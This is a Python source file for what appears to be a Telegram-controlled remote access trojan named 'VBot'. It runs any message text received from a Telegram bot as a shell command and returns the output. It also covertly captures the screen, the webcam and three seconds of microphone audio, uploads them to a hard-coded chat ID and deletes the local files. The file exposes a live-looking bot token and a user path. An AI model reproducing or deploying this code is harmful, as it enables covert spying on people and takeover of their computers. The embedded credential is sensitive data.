import requests
import json
import os
import subprocess
import time
import telegram
from PIL import ImageGrab
import cv2
import sounddevice as sd
from scipy.io.wavfile import write

base = "https://api.telegram.org/bot6051585621:AAE2DHOYbCRrXsxWF8hQhd_i62ikJ5L2cTM/"
bot = telegram.Bot('6051585621:AAE2DHOYbCRrXsxWF8hQhd_i62ikJ5L2cTM')
v_temp_dir = 'C:\\Users\\naveen.simma\\Documents\\Project\\'
save_path = v_temp_dir + 'im.jpg'

def get_updates(offset=None):
        url = base + "getUpdates?timeout=100"
        if offset:
            url = url + "&offset={}".format(offset + 1)
        try:
            r = requests.get(url)
            return json.loads(r.content)
        except:
            return None

def send_message(msg, chat_id):
        url = base + "sendMessage?chat_id={}&text={}".format(chat_id, msg)
        if msg is not None:
            try:
                requests.get(url)
            except:
                pass
def main():            
    send_message('VBot started!','582942300')
    update_id = None
    while True:
        try:
            updates = get_updates(offset=update_id)   
            updates = updates["result"]
        except:
            updates=None

        if updates:
            for item in updates:
                update_id = item["update_id"]
                from_ = item["message"]["from"]["id"]
                try:
                    data = str(item["message"]["text"])
                except:
                    data = None
                if data[:2] == 'cd':
                    try:
                        os.chdir(data[3:])
                    except:
                        print("exception occured in cd ")
                if data == 'img':
                    try:
                        snapshot = ImageGrab.grab()
                        snapshot.save(save_path)
                        bot.send_photo(chat_id='582942300', photo=open(save_path, 'rb'))
                        os.chdir(v_temp_dir)
                        cmd = subprocess.Popen('del im.jpg',shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        out = str(output_byte,"utf-8")
                        print(out)
                    except:
                        print("exception occured in img ")
                if data == 'cimg':
                    try:
                        camera = cv2.VideoCapture(0)
                        return_value, image = camera.read()
                        cv2.imwrite(save_path, image)
                        del(camera)
                        bot.send_photo(chat_id='582942300', photo=open(save_path, 'rb'))
                        os.chdir(v_temp_dir)
                        cmd = subprocess.Popen('del im.jpg',shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        out = str(output_byte,"utf-8")
                        print(out)
                    except:
                        print("exception occured in cimg ")
                
                if data == 'mic':
                    try:                
                        save_paths = v_temp_dir + 'output.wav'
                        fs = 44100  # Sample rate
                        seconds = 3  # Duration of recording
                        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                        sd.wait()  # Wait until recording is finished
                        write(save_paths, fs, myrecording)  # Save as WAV file 
                        bot.send_audio(chat_id='582942300', audio=open(save_paths, 'rb'))
                        os.chdir(v_temp_dir)
                        cmd = subprocess.Popen('del output.wav',shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        out = str(output_byte,"utf-8")
                        print(out)
                    except:
                        print("exception occured in mic ")
                        
                
                if len(data) > 0:
                    try:
                        cmd = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_byte,"utf-8")
                        currentWD = os.getcwd() + "> "
                        if(output_str=='' or output_str==None):
                            output_str='empty' +'\n'                   
                        reply=output_str + "\n" +currentWD
                        print(output_str)
                    except:
                        print("excceptiion occured processing")
                send_message(reply, from_)

try:
    main()
except:
    time.sleep(5)
    main()
